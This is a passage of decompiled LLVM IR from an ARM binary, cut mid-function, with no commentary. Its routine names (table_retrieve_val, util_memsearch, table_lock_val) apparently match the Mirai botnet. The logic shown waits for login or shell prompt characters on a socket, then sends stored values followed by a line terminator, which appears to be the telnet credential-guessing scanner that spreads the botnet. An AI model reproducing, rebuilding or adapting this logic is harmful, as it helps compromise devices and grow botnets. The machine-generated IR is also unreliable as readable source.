  %v0_eff0 = load i32, i32* %r2.global-to-local, align 4
  %v1_eff0 = load i32, i32* @r6, align 4
  %v2_eff0 = add i32 %v1_eff0, 8
  %v3_eff0 = inttoptr i32 %v2_eff0 to i32*
  store i32 %v0_eff0, i32* %v3_eff0, align 4
  br label %dec_label_pc_eff4

dec_label_pc_eff4:                                ; preds = %dec_label_pc_f110, %dec_label_pc_efdc
  %v0_eff4 = load i32, i32* @r6, align 4
  %v1_eff4 = add i32 %v0_eff4, 12
  %v2_eff4 = inttoptr i32 %v1_eff4 to i32*
  %v3_eff4 = load i32, i32* %v2_eff4, align 4
  store i32 %v3_eff4, i32* %r0.global-to-local, align 4
  %v1_eff8 = add i32 %v3_eff4, -2
  store i32 %v1_eff8, i32* @r3, align 4
  %v7_effc = icmp eq i32 %v1_eff8, 8
  store i1 %v7_effc, i1* %cpsr_z.global-to-local, align 1
  %v5_f000 = and i32 %v1_eff8, 1073741824
  %v6_f000 = icmp ne i32 %v5_f000, 0
  store i1 %v6_f000, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_eff4, label %dec_label_pc_ef78.backedge [
    i32 2, label %dec_label_pc_f2e0
    i32 3, label %dec_label_pc_f798
    i32 4, label %dec_label_pc_f6a4
    i32 5, label %dec_label_pc_f484
    i32 6, label %dec_label_pc_f3b0
    i32 7, label %dec_label_pc_f5d0
    i32 8, label %dec_label_pc_f20c
    i32 9, label %dec_label_pc_f138
    i32 10, label %dec_label_pc_f094
  ]

dec_label_pc_f02c:                                ; preds = %dec_label_pc_ef90
  br i1 %v2_efb4, label %dec_label_pc_fb84, label %dec_label_pc_f030

dec_label_pc_f030:                                ; preds = %dec_label_pc_f02c
  %v3_f030 = icmp eq i32 %v4_efb0, -1
  store i1 %v3_f030, i1* %cpsr_c.global-to-local, align 1
  %v8_f030 = icmp eq i32 %v4_efb0, -1
  store i1 %v8_f030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f030, label %dec_label_pc_f038, label %dec_label_pc_efdc

dec_label_pc_f038:                                ; preds = %dec_label_pc_f030
  %v0_f038 = load i32, i32* @fp, align 4
  %v1_f038 = inttoptr i32 %v0_f038 to i32*
  %v2_f038 = load i32, i32* %v1_f038, align 4
  store i32 %v2_f038, i32* %r3.global-to-local, align 4
  %v2_f03c = icmp ugt i32 %v2_f038, 10
  store i1 %v2_f03c, i1* %cpsr_c.global-to-local, align 1
  %v7_f03c = icmp eq i32 %v2_f038, 11
  store i1 %v7_f03c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f03c, label %dec_label_pc_f07c, label %dec_label_pc_f044

dec_label_pc_f044:                                ; preds = %dec_label_pc_f038, %dec_label_pc_fb84
  %v0_f044 = load i32, i32* @r6, align 4
  %v1_f044 = add i32 %v0_f044, 4
  %v2_f044 = inttoptr i32 %v1_f044 to i32*
  %v3_f044 = load i32, i32* %v2_f044, align 4
  store i32 %v3_f044, i32* %r0.global-to-local, align 4
  %v1_f048 = call i32 @__GI___libc_close(i32 %v3_f044)
  store i32 %v1_f048, i32* %r0.global-to-local, align 4
  %v0_f04c = load i32, i32* @r6, align 4
  %v1_f04c = add i32 %v0_f04c, 284
  %v2_f04c = inttoptr i32 %v1_f04c to i8*
  %v3_f04c = load i8, i8* %v2_f04c, align 1
  %v4_f04c = zext i8 %v3_f04c to i32
  %v1_f050 = add nuw nsw i32 %v4_f04c, 1
  %v1_f054 = urem i32 %v1_f050, 256
  store i32 %v1_f054, i32* %r3.global-to-local, align 4
  %v2_f058 = icmp ugt i32 %v1_f054, 8
  store i1 %v2_f058, i1* %cpsr_c.global-to-local, align 1
  %v7_f058 = icmp eq i32 %v1_f054, 9
  store i1 %v7_f058, i1* %cpsr_z.global-to-local, align 1
  %v1_f05c = trunc i32 %v1_f050 to i8
  store i8 %v1_f05c, i8* %v2_f04c, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f064 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f064 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f064 = xor i1 %v1_f064, true
  %v3_f064 = and i1 %v0_f064, %v2_f064
  br i1 %v3_f064, label %bb421, label %.thread313

.thread313:                                       ; preds = %dec_label_pc_f044
  %v1_f068309314 = load i32, i32* @r6, align 4
  %v2_f068310315 = add i32 %v1_f068309314, 4
  %v3_f068311316 = inttoptr i32 %v2_f068310315 to i32*
  store i32 -1, i32* %v3_f068311316, align 4
  br label %bb422

bb421:                                            ; preds = %dec_label_pc_f044
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f068305 = load i32, i32* @r6, align 4
  %v2_f068306 = add i32 %v1_f068305, 4
  %v3_f068307 = inttoptr i32 %v2_f068306 to i32*
  store i32 -1, i32* %v3_f068307, align 4
  %v4_f06c = load i32, i32* %r3.global-to-local, align 4
  %v5_f06c = load i32, i32* @r6, align 4
  %v6_f06c = add i32 %v5_f06c, 12
  %v7_f06c = inttoptr i32 %v6_f06c to i32*
  store i32 %v4_f06c, i32* %v7_f06c, align 4
  %v4_f070 = load i32, i32* %r3.global-to-local, align 4
  %v5_f070 = trunc i32 %v4_f070 to i8
  %v6_f070 = load i32, i32* @r6, align 4
  %v7_f070 = add i32 %v6_f070, 284
  %v8_f070 = inttoptr i32 %v7_f070 to i8*
  store i8 %v5_f070, i8* %v8_f070, align 1
  %v0_f074.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f074.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb422

bb422:                                            ; preds = %.thread313, %bb421
  %v1_f078 = phi i1 [ %v1_f074.pre, %bb421 ], [ %v0_f064, %.thread313 ]
  %v0_f078 = phi i1 [ %v0_f074.pre, %bb421 ], [ %v1_f064, %.thread313 ]
  %v2_f074 = xor i1 %v1_f078, true
  %v3_f074 = or i1 %v0_f078, %v2_f074
  br i1 %v3_f074, label %bb423, label %bb424

bb423:                                            ; preds = %bb422
  %v4_f074 = load i32, i32* @r6, align 4
  store i32 %v4_f074, i32* %r0.global-to-local, align 4
  br label %bb424

bb424:                                            ; preds = %bb422, %bb423
  store i32 61564, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f074, i32 ptrtoint (i32* @global_var_e368.203 to i32))
  br label %dec_label_pc_f07c

dec_label_pc_f07c:                                ; preds = %dec_label_pc_ef74.loopexit, %dec_label_pc_ef78.backedge, %dec_label_pc_ef74.preheader, %dec_label_pc_f038, %dec_label_pc_ef5c, %dec_label_pc_ef14, %dec_label_pc_fb68, %bb424
  %v3_f07c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f07c, i32* %r3.global-to-local, align 4
  %v1_f080 = add i32 %v3_f07c, 1
  store i32 %v1_f080, i32* @r4, align 4
  %v2_f084 = icmp ugt i32 %v1_f080, 254
  store i1 %v2_f084, i1* %cpsr_c.global-to-local, align 1
  %v7_f084 = icmp eq i32 %v1_f080, 255
  store i1 %v7_f084, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f080, i32* %stack_var_-52, align 4
  %v7_f08c = icmp slt i32 %v1_f080, 256
  br i1 %v7_f08c, label %dec_label_pc_ef14, label %dec_label_pc_e894

dec_label_pc_f094:                                ; preds = %dec_label_pc_eff4
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_f098 = call i32 @table_unlock_val(i32 12)
  store i32 %v2_f828, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v3_f0a8 = call i32 @table_retrieve_val(i32 12, i32* nonnull %stack_var_-60)
  %v3_f0ac = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f0a8, i32* %r2.global-to-local, align 4
  %v1_f0b4 = add i32 %v3_f0ac, -1
  store i32 %v1_f0b4, i32* %r3.global-to-local, align 4
  %v0_f0b8 = load i32, i32* @sb, align 4
  store i32 %v0_f0b8, i32* %r0.global-to-local, align 4
  %v0_f0bc = load i32, i32* @r6, align 4
  %v1_f0bc = add i32 %v0_f0bc, 24
  %v2_f0bc = inttoptr i32 %v1_f0bc to i32*
  %v3_f0bc = load i32, i32* %v2_f0bc, align 4
  store i32 %v3_f0bc, i32* %r1.global-to-local, align 4
  %v4_f0c0 = call i32 @util_memsearch(i32 %v0_f0b8, i32 %v3_f0bc, i32 %v3_f0a8, i32 %v1_f0b4)
  %v2_f0c4 = icmp eq i32 %v4_f0c0, -1
  store i1 %v2_f0c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f0c4 = icmp eq i32 %v4_f0c0, -1
  store i1 %v7_f0c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_f0c0, i32* @r4, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_f98c = call i32 @table_lock_val(i32 12)
  br i1 %v7_f0c4, label %dec_label_pc_f988, label %dec_label_pc_f0d0

dec_label_pc_f0d0:                                ; preds = %dec_label_pc_f094
  store i32 %v1_f98c, i32* %r0.global-to-local, align 4
  %v0_f0d8 = load i32, i32* @r6, align 4
  %v1_f0d8 = add i32 %v0_f0d8, 4
  %v2_f0d8 = inttoptr i32 %v1_f0d8 to i32*
  %v3_f0d8 = load i32, i32* %v2_f0d8, align 4
  store i32 %v3_f0d8, i32* %r0.global-to-local, align 4
  %v1_f0dc = call i32 @__GI___libc_close(i32 %v3_f0d8)
  store i32 %v1_f0dc, i32* %r0.global-to-local, align 4
  %v0_f0e0 = load i32, i32* @r6, align 4
  %v1_f0e0 = add i32 %v0_f0e0, 284
  %v2_f0e0 = inttoptr i32 %v1_f0e0 to i8*
  %v3_f0e0 = load i8, i8* %v2_f0e0, align 1
  %v4_f0e0 = zext i8 %v3_f0e0 to i32
  %v1_f0e4 = add nuw nsw i32 %v4_f0e0, 1
  %v1_f0e8 = urem i32 %v1_f0e4, 256
  store i32 %v1_f0e8, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f0f0 = icmp ugt i32 %v1_f0e8, 9
  store i1 %v2_f0f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f0f0 = icmp eq i32 %v1_f0e8, 10
  store i1 %v7_f0f0, i1* %cpsr_z.global-to-local, align 1
  %v2_f0f4 = add i32 %v0_f0e0, 4
  %v3_f0f4 = inttoptr i32 %v2_f0f4 to i32*
  store i32 -1, i32* %v3_f0f4, align 4
  %v0_f0f8 = load i32, i32* @r3, align 4
  %v1_f0f8 = trunc i32 %v0_f0f8 to i8
  %v2_f0f8 = load i32, i32* @r6, align 4
  %v3_f0f8 = add i32 %v2_f0f8, 284
  %v4_f0f8 = inttoptr i32 %v3_f0f8 to i8*
  store i8 %v1_f0f8, i8* %v4_f0f8, align 1
  %v0_f0fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0fc, label %dec_label_pc_f100, label %dec_label_pc_fa78

dec_label_pc_f100:                                ; preds = %dec_label_pc_f0d0
  store i32 0, i32* @r3, align 4
  %v1_f104 = load i32, i32* @r6, align 4
  %v2_f104 = add i32 %v1_f104, 12
  %v3_f104 = inttoptr i32 %v2_f104 to i32*
  store i32 0, i32* %v3_f104, align 4
  %v0_f108 = load i32, i32* @r3, align 4
  %v1_f108 = trunc i32 %v0_f108 to i8
  %v2_f108 = load i32, i32* @r6, align 4
  %v3_f108 = add i32 %v2_f108, 284
  %v4_f108 = inttoptr i32 %v3_f108 to i8*
  store i8 %v1_f108, i8* %v4_f108, align 1
  br label %dec_label_pc_f10c

dec_label_pc_f10c:                                ; preds = %dec_label_pc_fa78, %dec_label_pc_f100
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_f110

dec_label_pc_f110:                                ; preds = %dec_label_pc_f78c, %dec_label_pc_f64c, %dec_label_pc_f500, %dec_label_pc_f42c, %dec_label_pc_f288, %dec_label_pc_f1b4, %dec_label_pc_f10c
  %v0_f110 = load i32, i32* @r6, align 4
  %v1_f110 = add i32 %v0_f110, 24
  %v2_f110 = inttoptr i32 %v1_f110 to i32*
  %v3_f110 = load i32, i32* %v2_f110, align 4
  %v0_f114 = load i32, i32* @r7, align 4
  %v2_f114 = sub i32 %v0_f114, %v3_f110
  %v3_f114 = icmp uge i32 %v0_f114, %v3_f110
  store i1 %v3_f114, i1* %cpsr_c.global-to-local, align 1
  %v4_f114 = xor i32 %v0_f114, %v3_f110
  %v5_f114 = xor i32 %v2_f114, %v0_f114
  %v6_f114 = and i32 %v5_f114, %v4_f114
  %v7_f114 = icmp slt i32 %v6_f114, 0
  %v8_f114 = icmp slt i32 %v2_f114, 0
  %v9_f114 = icmp eq i32 %v0_f114, %v3_f110
  store i1 %v9_f114, i1* %cpsr_z.global-to-local, align 1
  %v2_f118 = xor i1 %v8_f114, %v7_f114
  %v0_f114.v3_f110 = select i1 %v2_f118, i32 %v0_f114, i32 %v3_f110
  store i32 %v0_f114.v3_f110, i32* %r1.global-to-local, align 4
  %v2_f120 = sub i32 %v3_f110, %v0_f114.v3_f110
  store i32 %v2_f120, i32* @r2, align 4
  store i32 %v2_f120, i32* %v2_f110, align 4
  %v0_f128 = load i32, i32* @sb, align 4
  %v1_f128 = load i32, i32* %r1.global-to-local, align 4
  %v2_f128 = add i32 %v1_f128, %v0_f128
  store i32 %v2_f128, i32* @r1, align 4
  store i32 %v0_f128, i32* @r0, align 4
  %v3_f130 = call i32 @memmove(i32 %v0_f128, i32 %v2_f128, i32 %v2_f120)
  store i32 %v3_f130, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eff4

dec_label_pc_f138:                                ; preds = %dec_label_pc_eff4
  %v1_f138 = add i32 %v0_eff4, 24
  %v2_f138 = inttoptr i32 %v1_f138 to i32*
  %v3_f138 = load i32, i32* %v2_f138, align 4
  store i32 %v3_f138, i32* %r2.global-to-local, align 4
  %v1_f13c = add i32 %v3_f138, -1
  store i32 %v1_f13c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f140 = icmp eq i32 %v1_f13c, 0
  store i1 %v2_f140, i1* %cpsr_z.global-to-local, align 1
  %tmp427 = icmp slt i32 %v1_f13c, 1
  br i1 %tmp427, label %dec_label_pc_ef78.backedge.thread, label %dec_label_pc_f148

dec_label_pc_f148:                                ; preds = %dec_label_pc_f138
  %v2_f148 = add i32 %v1_f13c, %v0_eff4
  store i32 %v2_f148, i32* %r3.global-to-local, align 4
  %v1_f14c = add i32 %v2_f148, 28
  %v2_f14c = inttoptr i32 %v1_f14c to i8*
  %v3_f14c = load i8, i8* %v2_f14c, align 1
  %v4_f14c = zext i8 %v3_f14c to i32
  store i32 %v4_f14c, i32* %r3.global-to-local, align 4
  %v2_f150 = icmp ugt i8 %v3_f14c, 61
  store i1 %v2_f150, i1* %cpsr_c.global-to-local, align 1
  %v7_f150 = icmp eq i8 %v3_f14c, 62
  store i1 %v7_f150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f150, label %dec_label_pc_f1b4, label %bb428

bb428:                                            ; preds = %dec_label_pc_f148
  %v3_f154 = icmp ugt i8 %v3_f14c, 57
  store i1 %v3_f154, i1* %cpsr_c.global-to-local, align 1
  %v8_f154 = icmp eq i8 %v3_f14c, 58
  store i1 %v8_f154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f154, label %dec_label_pc_f1b4, label %dec_label_pc_f15c

dec_label_pc_f15c:                                ; preds = %bb428
  %v2_f15c = icmp ugt i8 %v3_f14c, 35
  store i1 %v2_f15c, i1* %cpsr_c.global-to-local, align 1
  %v7_f15c = icmp eq i8 %v3_f14c, 36
  store i1 %v7_f15c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f15c, label %dec_label_pc_f1b4, label %dec_label_pc_f164

dec_label_pc_f164:                                ; preds = %dec_label_pc_f15c
  %v2_f164 = icmp ugt i8 %v3_f14c, 34
  store i1 %v2_f164, i1* %cpsr_c.global-to-local, align 1
  %v7_f164 = icmp eq i8 %v3_f14c, 35
  store i1 %v7_f164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f164, label %dec_label_pc_f1b4, label %dec_label_pc_f16c

dec_label_pc_f16c:                                ; preds = %dec_label_pc_f164
  %v2_f16c = icmp ugt i8 %v3_f14c, 36
  store i1 %v2_f16c, i1* %cpsr_c.global-to-local, align 1
  %v7_f16c = icmp eq i8 %v3_f14c, 37
  store i1 %v7_f16c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f16c, label %dec_label_pc_f1b4, label %dec_label_pc_f19c.preheader

dec_label_pc_f19c.preheader:                      ; preds = %dec_label_pc_f16c
  %v3_f170 = add i32 %v0_eff4, 28
  %v2_f174 = add i32 %v3_f170, %v3_f138
  store i32 %v2_f174, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f19c

dec_label_pc_f180:                                ; preds = %bb429
  %v2_f180 = icmp ugt i8 %v3_f1a4, 35
  store i1 %v2_f180, i1* %cpsr_c.global-to-local, align 1
  %v7_f180 = icmp eq i8 %v3_f1a4, 36
  store i1 %v7_f180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f180, label %dec_label_pc_f1b4, label %dec_label_pc_f188

dec_label_pc_f188:                                ; preds = %dec_label_pc_f180
  %v2_f188 = icmp ugt i8 %v3_f1a4, 34
  store i1 %v2_f188, i1* %cpsr_c.global-to-local, align 1
  %v7_f188 = icmp eq i8 %v3_f1a4, 35
  store i1 %v7_f188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f188, label %dec_label_pc_f1b4, label %dec_label_pc_f190

dec_label_pc_f190:                                ; preds = %dec_label_pc_f188
  %v2_f190 = icmp ugt i8 %v3_f1a4, 36
  store i1 %v2_f190, i1* %cpsr_c.global-to-local, align 1
  %v7_f190 = icmp eq i8 %v3_f1a4, 37
  store i1 %v7_f190, i1* %cpsr_z.global-to-local, align 1
  %v1_f194 = add i32 %v0_f194, -1
  store i32 %v1_f194, i32* %r3.global-to-local, align 4
  br i1 %v7_f190, label %dec_label_pc_f1b4, label %dec_label_pc_f19c

dec_label_pc_f19c:                                ; preds = %dec_label_pc_f19c.preheader, %dec_label_pc_f190
  %v0_f194 = phi i32 [ %v2_f174, %dec_label_pc_f19c.preheader ], [ %v1_f194, %dec_label_pc_f190 ]
  %v0_f19c = phi i32 [ %v1_f13c, %dec_label_pc_f19c.preheader ], [ %v1_f19c, %dec_label_pc_f190 ]
  %v1_f19c = add i32 %v0_f19c, -1
  store i32 %v1_f19c, i32* %r1.global-to-local, align 4
  %v2_f19c = icmp ne i32 %v0_f19c, 0
  store i1 %v2_f19c, i1* %cpsr_c.global-to-local, align 1
  %v7_f19c = icmp eq i32 %v0_f19c, 1
  store i1 %v7_f19c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f19c, label %dec_label_pc_ef78.backedge.thread561, label %dec_label_pc_f1a4

dec_label_pc_f1a4:                                ; preds = %dec_label_pc_f19c
  %v1_f1a4 = add i32 %v0_f194, -2
  %v2_f1a4 = inttoptr i32 %v1_f1a4 to i8*
  %v3_f1a4 = load i8, i8* %v2_f1a4, align 1
  %v4_f1a4 = zext i8 %v3_f1a4 to i32
  store i32 %v4_f1a4, i32* %r2.global-to-local, align 4
  %v2_f1a8 = icmp ugt i8 %v3_f1a4, 61
  store i1 %v2_f1a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1a8 = icmp eq i8 %v3_f1a4, 62
  store i1 %v7_f1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1a8, label %dec_label_pc_f1b4, label %bb429

bb429:                                            ; preds = %dec_label_pc_f1a4
  %v3_f1ac = icmp ugt i8 %v3_f1a4, 57
  store i1 %v3_f1ac, i1* %cpsr_c.global-to-local, align 1
  %v8_f1ac = icmp eq i8 %v3_f1a4, 58
  store i1 %v8_f1ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1ac, label %dec_label_pc_f1b4, label %dec_label_pc_f180

dec_label_pc_f1b4:                                ; preds = %dec_label_pc_f1a4, %bb429, %dec_label_pc_f190, %dec_label_pc_f188, %dec_label_pc_f180, %dec_label_pc_f16c, %dec_label_pc_f148, %dec_label_pc_f164, %dec_label_pc_f15c, %bb428
  %v0_f1b8 = phi i32 [ %v1_f13c, %dec_label_pc_f16c ], [ %v1_f13c, %dec_label_pc_f148 ], [ %v1_f13c, %dec_label_pc_f164 ], [ %v1_f13c, %dec_label_pc_f15c ], [ %v1_f13c, %bb428 ], [ %v1_f19c, %dec_label_pc_f180 ], [ %v1_f19c, %dec_label_pc_f188 ], [ %v1_f19c, %dec_label_pc_f190 ], [ %v1_f19c, %bb429 ], [ %v1_f19c, %dec_label_pc_f1a4 ]
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f1b8 = add i32 %v0_f1b8, 1
  store i32 %v1_f1b8, i32* @r7, align 4
  %v1_f1bc = call i32 @table_unlock_val(i32 10)
  store i32 %v2_f828, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_f1cc = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  store i32 %v3_f1cc, i32* %r0.global-to-local, align 4
  %v3_f1d0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f1d0, i32* %r2.global-to-local, align 4
  store i32 %v3_f1cc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f1dc = load i32, i32* @r6, align 4
  %v1_f1dc = add i32 %v0_f1dc, 4
  %v2_f1dc = inttoptr i32 %v1_f1dc to i32*
  %v3_f1dc = load i32, i32* %v2_f1dc, align 4
  store i32 %v3_f1dc, i32* %r0.global-to-local, align 4
  %v4_f1e0 = call i32 @__libc_send(i32 %v3_f1dc, i32 %v3_f1cc, i32 %v3_f1d0, i32 16384)
  store i32 %v4_f1e0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f1f0 = load i32, i32* @r6, align 4
  %v1_f1f0 = add i32 %v0_f1f0, 4
  %v2_f1f0 = inttoptr i32 %v1_f1f0 to i32*
  %v3_f1f0 = load i32, i32* %v2_f1f0, align 4
  store i32 %v3_f1f0, i32* %r0.global-to-local, align 4
  %v4_f1f4 = call i32 @__libc_send(i32 %v3_f1f0, i32 ptrtoint ([3 x i8]* @global_var_19310.205 to i32), i32 2, i32 16384)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f1fc = call i32 @table_lock_val(i32 10)
  store i32 %v1_f1fc, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_f204 = load i32, i32* @r6, align 4
  %v2_f204 = add i32 %v1_f204, 12
  %v3_f204 = inttoptr i32 %v2_f204 to i32*
  store i32 10, i32* %v3_f204, align 4
  br label %dec_label_pc_f110

dec_label_pc_f20c:                                ; preds = %dec_label_pc_eff4
  %v1_f20c = add i32 %v0_eff4, 24
  %v2_f20c = inttoptr i32 %v1_f20c to i32*
  %v3_f20c = load i32, i32* %v2_f20c, align 4
  store i32 %v3_f20c, i32* %r2.global-to-local, align 4
  %v1_f210 = add i32 %v3_f20c, -1
  store i32 %v1_f210, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f214 = icmp eq i32 %v1_f210, 0
  store i1 %v2_f214, i1* %cpsr_z.global-to-local, align 1
  %tmp430 = icmp slt i32 %v1_f210, 1
  br i1 %tmp430, label %dec_label_pc_ef78.backedge.thread, label %dec_label_pc_f21c

dec_label_pc_f21c:                                ; preds = %dec_label_pc_f20c
  %v2_f21c = add i32 %v1_f210, %v0_eff4
  store i32 %v2_f21c, i32* %r3.global-to-local, align 4
  %v1_f220 = add i32 %v2_f21c, 28
  %v2_f220 = inttoptr i32 %v1_f220 to i8*
  %v3_f220 = load i8, i8* %v2_f220, align 1
  %v4_f220 = zext i8 %v3_f220 to i32
  store i32 %v4_f220, i32* %r3.global-to-local, align 4
  %v2_f224 = icmp ugt i8 %v3_f220, 61
  store i1 %v2_f224, i1* %cpsr_c.global-to-local, align 1
  %v7_f224 = icmp eq i8 %v3_f220, 62
  store i1 %v7_f224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f224, label %dec_label_pc_f288, label %bb431

bb431:                                            ; preds = %dec_label_pc_f21c
  %v3_f228 = icmp ugt i8 %v3_f220, 57
  store i1 %v3_f228, i1* %cpsr_c.global-to-local, align 1
  %v8_f228 = icmp eq i8 %v3_f220, 58
  store i1 %v8_f228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f228, label %dec_label_pc_f288, label %dec_label_pc_f230

dec_label_pc_f230:                                ; preds = %bb431
  %v2_f230 = icmp ugt i8 %v3_f220, 35
  store i1 %v2_f230, i1* %cpsr_c.global-to-local, align 1
  %v7_f230 = icmp eq i8 %v3_f220, 36
  store i1 %v7_f230, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f230, label %dec_label_pc_f288, label %dec_label_pc_f238

dec_label_pc_f238:                                ; preds = %dec_label_pc_f230
  %v2_f238 = icmp ugt i8 %v3_f220, 34
  store i1 %v2_f238, i1* %cpsr_c.global-to-local, align 1
  %v7_f238 = icmp eq i8 %v3_f220, 35
  store i1 %v7_f238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f238, label %dec_label_pc_f288, label %dec_label_pc_f240

dec_label_pc_f240:                                ; preds = %dec_label_pc_f238
  %v2_f240 = icmp ugt i8 %v3_f220, 36
  store i1 %v2_f240, i1* %cpsr_c.global-to-local, align 1
  %v7_f240 = icmp eq i8 %v3_f220, 37
  store i1 %v7_f240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f240, label %dec_label_pc_f288, label %dec_label_pc_f270.preheader

dec_label_pc_f270.preheader:                      ; preds = %dec_label_pc_f240
  %v3_f244 = add i32 %v0_eff4, 28
  %v2_f248 = add i32 %v3_f244, %v3_f20c
  store i32 %v2_f248, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f270

dec_label_pc_f254:                                ; preds = %bb432
  %v2_f254 = icmp ugt i8 %v3_f278, 35
  store i1 %v2_f254, i1* %cpsr_c.global-to-local, align 1
  %v7_f254 = icmp eq i8 %v3_f278, 36
  store i1 %v7_f254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f254, label %dec_label_pc_f288, label %dec_label_pc_f25c

dec_label_pc_f25c:                                ; preds = %dec_label_pc_f254
  %v2_f25c = icmp ugt i8 %v3_f278, 34
  store i1 %v2_f25c, i1* %cpsr_c.global-to-local, align 1
  %v7_f25c = icmp eq i8 %v3_f278, 35
  store i1 %v7_f25c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f25c, label %dec_label_pc_f288, label %dec_label_pc_f264

dec_label_pc_f264:                                ; preds = %dec_label_pc_f25c
  %v2_f264 = icmp ugt i8 %v3_f278, 36
  store i1 %v2_f264, i1* %cpsr_c.global-to-local, align 1
  %v7_f264 = icmp eq i8 %v3_f278, 37
  store i1 %v7_f264, i1* %cpsr_z.global-to-local, align 1
  %v1_f268 = add i32 %v0_f268, -1
  store i32 %v1_f268, i32* %r3.global-to-local, align 4
  br i1 %v7_f264, label %dec_label_pc_f288, label %dec_label_pc_f270

dec_label_pc_f270:                                ; preds = %dec_label_pc_f270.preheader, %dec_label_pc_f264
  %v0_f268 = phi i32 [ %v2_f248, %dec_label_pc_f270.preheader ], [ %v1_f268, %dec_label_pc_f264 ]
  %v0_f270 = phi i32 [ %v1_f210, %dec_label_pc_f270.preheader ], [ %v1_f270, %dec_label_pc_f264 ]
  %v1_f270 = add i32 %v0_f270, -1
  store i32 %v1_f270, i32* %r1.global-to-local, align 4
  %v2_f270 = icmp ne i32 %v0_f270, 0
  store i1 %v2_f270, i1* %cpsr_c.global-to-local, align 1
  %v7_f270 = icmp eq i32 %v0_f270, 1
  store i1 %v7_f270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f270, label %dec_label_pc_ef78.backedge.thread561, label %dec_label_pc_f278

dec_label_pc_f278:                                ; preds = %dec_label_pc_f270
  %v1_f278 = add i32 %v0_f268, -2
  %v2_f278 = inttoptr i32 %v1_f278 to i8*
  %v3_f278 = load i8, i8* %v2_f278, align 1
  %v4_f278 = zext i8 %v3_f278 to i32
  store i32 %v4_f278, i32* %r2.global-to-local, align 4
  %v2_f27c = icmp ugt i8 %v3_f278, 61
  store i1 %v2_f27c, i1* %cpsr_c.global-to-local, align 1
  %v7_f27c = icmp eq i8 %v3_f278, 62
  store i1 %v7_f27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f27c, label %dec_label_pc_f288, label %bb432

bb432:                                            ; preds = %dec_label_pc_f278
  %v3_f280 = icmp ugt i8 %v3_f278, 57
  store i1 %v3_f280, i1* %cpsr_c.global-to-local, align 1
  %v8_f280 = icmp eq i8 %v3_f278, 58
  store i1 %v8_f280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f280, label %dec_label_pc_f288, label %dec_label_pc_f254

dec_label_pc_f288:                                ; preds = %dec_label_pc_f278, %bb432, %dec_label_pc_f264, %dec_label_pc_f25c, %dec_label_pc_f254, %dec_label_pc_f240, %dec_label_pc_f21c, %dec_label_pc_f238, %dec_label_pc_f230, %bb431
  %v0_f28c = phi i32 [ %v1_f210, %dec_label_pc_f240 ], [ %v1_f210, %dec_label_pc_f21c ], [ %v1_f210, %dec_label_pc_f238 ], [ %v1_f210, %dec_label_pc_f230 ], [ %v1_f210, %bb431 ], [ %v1_f270, %dec_label_pc_f254 ], [ %v1_f270, %dec_label_pc_f25c ], [ %v1_f270, %dec_label_pc_f264 ], [ %v1_f270, %bb432 ], [ %v1_f270, %dec_label_pc_f278 ]
